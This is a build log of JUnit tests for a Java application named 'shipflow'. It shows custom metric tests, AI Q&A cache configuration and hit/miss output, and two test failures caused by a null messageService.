2026-01-17T23:26:53.603Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Created custom metric with ID: 102
2026-01-17T23:26:53.604Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Pitch Metric' for user 1
2026-01-17T23:26:53.604Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Created custom metric with ID: 101
2026-01-17T23:26:53.604Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Multi-Scope Metric' for user 1
2026-01-17T23:26:53.605Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Created custom metric with ID: 103
2026-01-17T23:26:53.605Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Invalid Cycle Metric' for user 1
2026-01-17T23:26:53.606Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Invalid Team Metric' for user 1
2026-01-17T23:26:53.606Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Global Metric' for user 1
2026-01-17T23:26:53.606Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Created custom metric with ID: 104
2026-01-17T23:26:53.607Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Invalid Pitch Metric' for user 1
2026-01-17T23:26:53.608Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Cycle Metric' for user 1
2026-01-17T23:26:53.608Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Created custom metric with ID: 100
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.006 s -- in com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$ScopeFeatureTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$UpdateMetricTests
2026-01-17T23:26:53.609Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Updating custom metric 999 for user 1
2026-01-17T23:26:53.610Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Updating custom metric 1 for user 999
2026-01-17T23:26:53.611Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Updating custom metric 1 for user 1
2026-01-17T23:26:53.611Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Updated custom metric: 1
[ERROR] Tests run: 3, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 0.003 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$UpdateMetricTests
[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$UpdateMetricTests.shouldThrowExceptionWhenMetricNotFound -- Time elapsed: 0.001 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$UpdateMetricTests.shouldThrowExceptionWhenMetricNotFound(CustomMetricServiceTest.java:238)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.lambda$4(CustomMetricService.java:109)
	at java.base/java.util.Optional.orElseThrow(Optional.java:403)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.updateMetric(CustomMetricService.java:109)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$UpdateMetricTests.lambda$0(CustomMetricServiceTest.java:239)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[ERROR] com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$UpdateMetricTests.shouldThrowExceptionWhenNotAuthorized -- Time elapsed: 0 s <<< FAILURE!
org.opentest4j.AssertionFailedError: Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
	at org.junit.jupiter.api.AssertionFailureBuilder.build(AssertionFailureBuilder.java:151)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:67)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:35)
	at org.junit.jupiter.api.Assertions.assertThrows(Assertions.java:3115)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$UpdateMetricTests.shouldThrowExceptionWhenNotAuthorized(CustomMetricServiceTest.java:253)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
Caused by: java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricService.updateMetric(CustomMetricService.java:113)
	at com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest$UpdateMetricTests.lambda$1(CustomMetricServiceTest.java:254)
	at org.junit.jupiter.api.AssertThrows.assertThrows(AssertThrows.java:53)
	... 7 more

[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.194 s -- in com.github.farzadsedaghatbin.shipflow.service.CustomMetricServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.KnowledgeIngestionServiceTest
[WARNING] Tests run: 1, Failures: 0, Errors: 0, Skipped: 1, Time elapsed: 0 s -- in com.github.farzadsedaghatbin.shipflow.service.KnowledgeIngestionServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest$QACacheDisabledTests
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:53.881Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:53.882Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:53.882Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:53.882Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:53.883Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.271 s -- in com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest$QACacheDisabledTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest$QACacheInvalidationTests
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:53.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:53.884Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:53.884Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:53.884Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_2_0_0, TTL=3 hours)
2026-01-17T23:26:53.884Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated Q&A cache for context: pitch_1
2026-01-17T23:26:53.884Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache miss for context: pitch_1_0_0
2026-01-17T23:26:53.884Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache miss for context: pitch_1_0_0
2026-01-17T23:26:53.884Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:53.885Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:53.885Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=cycle_1_1_0, TTL=3 hours)
2026-01-17T23:26:53.885Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=team_0_0_1, TTL=3 hours)
2026-01-17T23:26:53.885Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.002 s -- in com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest$QACacheInvalidationTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest$QACacheContextTests
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:53.886Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=cycle_1_1_0, TTL=3 hours)
2026-01-17T23:26:53.886Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache miss for context: cycle_2_2_0
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:53.886Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:53.886Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:53.886Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_2_0_0, TTL=3 hours)
2026-01-17T23:26:53.886Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
2026-01-17T23:26:53.886Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s -- in com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest$QACacheContextTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest$QACacheHitTests
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:53.887Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:53.887Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache miss for context: pitch_1_0_0
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:53.887Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:53.888Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:53.888Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache fuzzy hit (similarity=0.88, threshold=0.85, hits=1)
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:53.888Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:53.888Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:53.888Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s -- in com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest$QACacheHitTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.276 s -- in com.github.farzadsedaghatbin.shipflow.service.QAServiceWithCacheTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.teams.TeamsIntegrationServiceTest
